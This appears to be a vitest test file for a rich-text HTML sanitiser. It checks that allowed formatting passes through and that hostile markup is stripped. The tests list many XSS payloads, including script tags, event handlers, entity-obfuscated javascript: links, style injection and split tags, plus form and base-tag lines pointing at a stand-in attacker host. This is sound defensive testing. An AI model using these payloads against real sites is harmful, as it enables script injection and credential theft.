// Prompt 918 (Adenda 1, D) — the description of a call can be formatted, and nothing malicious gets through. The sanitiser REBUILDS the text from a closed list; these tests attack it:
// scripts, event handlers, javascript: links in every disguise, style injection, iframes/SVG, broken and nested markup, entities, control characters, hostile sizes, and a fuzz that
// checks every output against a strict grammar. And what the people write — lists, bold, links, colours from the palette — comes through.
import { describe, expect, it } from 'vitest';
import { RICH_MAX_HTML, RICH_MAX_TEXT, RICH_PALETTE, looksLikeHtml, normalizeDescription, renderDescription, richTextToPlain, safeHref, sanitizeRichText } from './rich-text';

const NUL = String.fromCharCode(0);
const S = sanitizeRichText;

/** The only shapes an output may be made of. Anything else is a failure, whatever the input was. */
const TOKEN = /<\/?(?:p|strong|em|h2|h3|ul|ol|li|span)>|<br>|<a href="(?:https?:\/\/|mailto:)[^"<>\s]*" rel="noopener noreferrer" target="_blank">|<\/a>|<span style="color:#[0-9A-F]{6}">|<(?:strong|em) style="color:#[0-9A-F]{6}">|[^<>]+|&(?:amp|lt|gt|quot|#39);/g;
function assertGrammar(out: string) {
  expect(out.replace(TOKEN, ''), `not in the grammar: ${out.slice(0, 200)}`).toBe('');
  const stack: string[] = [];
  for (const m of out.matchAll(/<(\/?)([a-z0-9]+)[^>]*>/g)) {
    if (m[2] === 'br') continue;
    if (m[1]) expect(stack.pop(), `unbalanced: ${out.slice(0, 200)}`).toBe(m[2]); else stack.push(m[2]);
  }
  expect(stack, 'unclosed').toEqual([]);
  expect(out).not.toMatch(/<(?!\/?(?:p|br|strong|em|h2|h3|ul|ol|li|a|span)[\s>])/);
  expect(out.toLowerCase()).not.toMatch(/<script|<style|<iframe|<svg|<img|<object|<embed/);                 // text may SAY "javascript:"; no tag can
}

describe('what people write comes through', () => {
  it('bold, italic, two heading sizes, bulleted and numbered lists, paragraphs', () => {
    const html = '<h2>Who can apply</h2><p>Startups <strong>with</strong> a <em>product</em>.</p><h3>Documents</h3><ul><li>Pitch deck</li><li>Business plan</li></ul><ol><li>Apply</li><li>Wait</li></ol>';
    expect(S(html)).toBe(html);
  });
  it('b and i become strong and em; the other headings fall to the two we have; a div is a paragraph', () => {
    expect(S('<b>x</b> <i>y</i>')).toBe('<strong>x</strong> <em>y</em>');
    expect(S('<h1>a</h1><h4>b</h4><h6>c</h6>')).toBe('<h2>a</h2><h3>b</h3><h3>c</h3>');
    expect(S('<div>one</div><div>two</div>')).toBe('<p>one</p><p>two</p>');
  });
  it('a link opens in a new tab, without the opener or the referrer — and keeps only href', () => {
    expect(S('<a href="https://sherlockdeal.com/x?a=1&amp;b=2" onclick="x()" target="_self" style="color:red" class="z">site</a>'))
      .toBe('<a href="https://sherlockdeal.com/x?a=1&amp;b=2" rel="noopener noreferrer" target="_blank">site</a>');
    expect(S('<a href="mailto:apply@fund.eu">write</a>')).toBe('<a href="mailto:apply@fund.eu" rel="noopener noreferrer" target="_blank">write</a>');
  });
  it('the palette — and only the palette: as #hex or as the rgb() a browser writes — becomes a span with just that colour', () => {
    for (const c of RICH_PALETTE) {
      const rgb = `rgb(${parseInt(c.hex.slice(1, 3), 16)}, ${parseInt(c.hex.slice(3, 5), 16)}, ${parseInt(c.hex.slice(5, 7), 16)})`;
      expect(S(`<span style="color: ${c.hex.toLowerCase()}">t</span>`)).toBe(`<span style="color:${c.hex}">t</span>`);
      expect(S(`<span style="color: ${rgb};">t</span>`)).toBe(`<span style="color:${c.hex}">t</span>`);
    }
    expect(RICH_PALETTE.length).toBeGreaterThanOrEqual(6); expect(RICH_PALETTE.length).toBeLessThanOrEqual(8);
  });
  it('unclosed tags are closed, a list item without its list is not left open', () => {
    expect(S('<strong>bold <em>both')).toBe('<strong>bold <em>both</em></strong>');
    expect(S('<ul><li>a<li>b</ul>')).toBe('<ul><li>a</li><li>b</li></ul>');
  });
  it('plain characters stay plain: < > & are escaped, not lost', () => {
    expect(S('a < b && c > d')).toBe('a &lt; b &amp;&amp; c &gt; d');
    expect(S('5 <3 and x < y')).toBe('5 &lt;3 and x &lt; y');
  });
});

describe('nothing malicious gets through', () => {
  const attacks: [string, string][] = [
    ['script', '<script>alert(1)</script>hello'],
    ['script upper-case and spaced', '<SCRIPT  src=//evil.example/x.js ></ScRiPt >after'],
    ['script never closed', 'before<script>alert(1)'],
    ['img onerror', '<img src=x onerror=alert(1)>text'],
    ['svg onload', '<svg onload=alert(1)><p>inside</p></svg>after'],
    ['math/svg wrapper', '<math><mi xlink:href="javascript:alert(1)">x</mi></math>after'],
    ['iframe', '<iframe src="javascript:alert(1)"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>after'],
    ['object/embed', '<object data="x.swf"></object><embed src="x">after'],
    ['style block', '<style>body{display:none}</style>after'],
    ['style attribute', '<p style="position:fixed;top:0;left:0;width:100%;height:100%;background:url(javascript:alert(1))">covered</p>'],
    ['span with free style', '<span style="color:red;background:url(//evil.example/p.gif);position:absolute">x</span>'],
    ['span with an expression', '<span style="color:expression(alert(1))">x</span>'],
    ['onclick on an allowed tag', '<p onclick="alert(1)" onmouseover=alert(2)>hover</p>'],
    ['onfocus autofocus', '<a href="https://ok.example" onfocus="alert(1)" autofocus>x</a>'],
    ['javascript link', '<a href="javascript:alert(1)">x</a>'],
    ['javascript link, case and whitespace', '<a href="  JaVa\nScRiPt:alert(1)">x</a>'],
    ['javascript link, numeric entities', '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>'],
    ['javascript link, named colon', '<a href="javascript&colon;alert(1)">x</a>'],
    ['javascript link, entity without semicolon', '<a href="&#x6A;avascript:alert(1)">x</a>'],
    ['javascript link, tab inside', '<a href="java&Tab;script:alert(1)">x</a>'],
    ['data link', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
    ['vbscript link', '<a href="vbscript:msgbox(1)">x</a>'],
    ['protocol-relative link', '<a href="//evil.example/x">x</a>'],
    ['relative link', '<a href="/admin/delete">x</a>'],
    ['file link', '<a href="file:///etc/passwd">x</a>'],
    ['no href', '<a name="x">x</a>'],
    ['tag split to hide it', '<scr<script>ipt>alert(1)</scr</script>ipt>'],
    ['null byte inside the tag name', `<scr${NUL}ipt>alert(1)</scr${NUL}ipt>`],
    ['a "<" and then a tag', '<<script>alert(1)//<</script>'],
    ['comment around a script', '<!-- <script>alert(1)</script> -->after'],
    ['conditional comment', '<!--[if IE]><script>alert(1)</script><![endif]-->after'],
    ['CDATA', '<![CDATA[<script>alert(1)</script>]]>after'],
    ['processing instruction', '<?php echo 1; ?>after'],
    ['doctype', '<!DOCTYPE html><html><head><title>x</title></head><body><p>hi</p></body></html>'],
    ['form and input', '<form action="//evil.example"><input name=p type=password><button>go</button></form>'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=//evil.example">after'],
    ['base tag', '<base href="//evil.example/">after'],
    ['attribute with an angle bracket', '<a href="https://ok.example" title="><script>alert(1)</script>">x</a>'],
    ['unterminated attribute value', '<a href="https://ok.example onclick=alert(1)>x</a>'],
    ['escaped tags are just text', '&lt;script&gt;alert(1)&lt;/script&gt;'],
    ['entity-encoded angle brackets then more', '&#60;script&#62;alert(1)&#60;/script&#62;'],
    ['a long run of unusual attributes', `<a ${'x=1 '.repeat(500)} href="javascript:alert(1)">x</a>`],
  ];
  for (const [name, input] of attacks) {
    it(name, () => {
      const out = S(input);
      assertGrammar(out);
      expect(out).not.toMatch(/alert\(1\)<|<[^>]*alert/);                      // nothing executable inside a tag
      expect(S(out), 'running it again changes nothing').toBe(out);
    });
  }
  it('what is left of the script attacks is harmless TEXT or nothing — never markup', () => {
    expect(S('<script>alert(1)</script>hello')).toBe('hello');
    expect(S('<svg onload=alert(1)><p>inside</p></svg>after')).toBe('after');
    expect(S('<a href="javascript:alert(1)">x</a>')).toBe('x');
    expect(S('<img src=x onerror=alert(1)>text')).toBe('text');
    expect(S('<p style="position:fixed">covered</p>')).toBe('<p>covered</p>');
    expect(S('&lt;script&gt;alert(1)&lt;/script&gt;')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });
  it('links: only http, https and mailto are links, whatever they are wrapped in', () => {
    for (const ok of ['https://a.example', 'http://a.example/x', 'MAILTO:a@b.example']) expect(safeHref(ok)).toBeTruthy();
    for (const bad of ['javascript:1', ' javascript:1', 'JAVASCRIPT:1', 'java\tscript:1', '&#106;avascript:1', 'data:text/html,x', 'vbscript:x', '//x.example', '/x', 'x', '', 'ftp://x', 'https://', 'https://a b']) expect(safeHref(bad), bad).toBeNull();
  });
  it('a hostile size is handled in a hostile time, and is capped', () => {
    for (const input of ['<'.repeat(100000), '<a '.repeat(30000), '<p>'.repeat(60000), '<script>'.repeat(10000), '<a x=1 '.repeat(10000), '&#'.repeat(40000), '<span style="color:#0E7490">'.repeat(30000), 'x'.repeat(500000)]) {
      const t0 = performance.now();
      const out = S(input);
      expect(performance.now() - t0, input.slice(0, 12)).toBeLessThan(1500);
      expect(out.length).toBeLessThanOrEqual(RICH_MAX_HTML + 200);
      assertGrammar(out);
    }
  });
  it('very deep nesting does not run away', () => {
    const out = S('<ul><li>'.repeat(500) + 'deep' + '</li></ul>'.repeat(500));
    expect((out.match(/<ul>/g) ?? []).length).toBeLessThan(40);
    assertGrammar(out);
  });
  it('FUZZ: whatever is thrown at it, the output is only the closed list, balanced, and stable', () => {
    let seed = 20261019;
    const rnd = () => (seed = (seed * 1664525 + 1013904223) % 4294967296) / 4294967296;
    const bits = ['<', '>', '/', '"', "'", '=', ' ', '\n', '&', '#', ';', 'a', 'p', 'ul', 'li', 'script', 'style', 'iframe', 'svg', 'href', 'onclick', 'javascript:', 'https://x.example', 'color:#0E7490', 'style', 'span', 'strong', 'em', 'br', 'h2', '<!--', '-->', '<![CDATA[', ']]>', '&lt;', '&#106;', '&colon;', NUL, 'text '];
    for (let n = 0; n < 4000; n++) {
      let input = '';
      for (let k = rnd() * 40; k > 0; k--) input += bits[Math.floor(rnd() * bits.length)];
      const out = S(input);
      assertGrammar(out);
      expect(S(out)).toBe(out);
    }
  });
});

describe('old descriptions, in plain text, look the same', () => {
  it('plain text has no markup, and shows as its paragraphs and line breaks, escaped', () => {
    expect(looksLikeHtml('Plain text, 5 < 6 & more.')).toBe(false);
    expect(renderDescription('Line one\n\nLine two\nthree & x < 5')).toBe('<p>Line one</p><p>Line two<br>three &amp; x &lt; 5</p>');
    expect(renderDescription('')).toBe('');
    expect(renderDescription(null)).toBe('');
  });
  it('a plain text that looks like an attack is shown as text', () => {
    expect(renderDescription('click <script>alert(1)</script> here')).not.toContain('<script');
    expect(renderDescription('click <script>alert(1)</script> here')).toBe('click  here');
  });
  it('formatted text is sanitised again when it is shown', () => {
    expect(renderDescription('<p onclick="x()">hi</p><script>alert(1)</script>')).toBe('<p>hi</p>');
  });
});

describe('what the server stores', () => {
  it('plain stays plain; formatted is sanitised; empty is nothing', () => {
    expect(normalizeDescription('  Just a sentence.  ')).toBe('Just a sentence.');
    expect(normalizeDescription('<p>Hi <b>there</b></p><script>x</script>')).toBe('<p>Hi <strong>there</strong></p>');
    for (const e of [null, undefined, 5, '', '   ', '<p></p>', '<p> <br> </p>', '<script>x</script>']) expect(normalizeDescription(e), String(e)).toBeNull();
  });
  it('too long is cut as PLAIN text (cutting markup is how it unbalances), never above the limit', () => {
    const long = `<p>${'word '.repeat(2000)}</p>`;
    const out = normalizeDescription(long)!;
    expect(out.length).toBeLessThanOrEqual(RICH_MAX_TEXT);
    expect(looksLikeHtml(out)).toBe(false);
    expect(normalizeDescription('x'.repeat(9000))!.length).toBe(RICH_MAX_TEXT);
  });
  it('the text of a formatted description, for emails and snippets, keeps its bullets and breaks', () => {
    expect(richTextToPlain('<h2>Title</h2><p>Intro <strong>bold</strong></p><ul><li>One</li><li>Two</li></ul>')).toBe('Title\nIntro bold\n\n• One\n• Two');
    expect(richTextToPlain('plain & simple')).toBe('plain & simple');
    expect(richTextToPlain('<p>a &amp; b &lt; c</p>')).toBe('a & b < c');
  });
});

describe('the import fills the description with the document\'s basic formatting, sanitised the same way', () => {
  it('lists and bold from the model come through; a script or a handler does not; plain text stays plain', async () => {
    const { sanitizeProposal } = await import('./calls/ai-import/proposal');
    const html = '<h2>About</h2><p>For <strong>early-stage</strong> startups.</p><ul><li>Health</li><li>Energy</li></ul><script>alert(1)</script><p onclick="x()">Apply <a href="javascript:alert(1)">here</a>.</p>';
    expect(sanitizeProposal({ general: { name: 'X', description: html } }).general.description).toBe('<h2>About</h2><p>For <strong>early-stage</strong> startups.</p><ul><li>Health</li><li>Energy</li></ul><p>Apply here.</p>');
    expect(sanitizeProposal({ general: { name: 'X', description: 'A plain sentence.' } }).general.description).toBe('A plain sentence.');
    expect(sanitizeProposal({ general: { name: 'X', description: '<script>alert(1)</script>' } }).general.description).toBeUndefined();
  });
});

describe('the colour a browser puts on text that is already bold or italic', () => {
  it('is kept when it is on the palette — on that tag — and dropped (with everything else of the style) when it is not', () => {
    expect(sanitizeRichText('<b style="color: rgb(14, 116, 144);">x</b>')).toBe('<strong style="color:#0E7490">x</strong>');
    expect(sanitizeRichText('<i style="color:#B91C1C;font-size:99px;position:fixed">x</i>')).toBe('<em style="color:#B91C1C">x</em>');
    expect(sanitizeRichText('<strong style="color:red;background:url(javascript:x)">x</strong>')).toBe('<strong>x</strong>');
    expect(sanitizeRichText('<strong style="color:#0E7490" onclick="x()">x</strong>')).toBe('<strong style="color:#0E7490">x</strong>');
  });
});
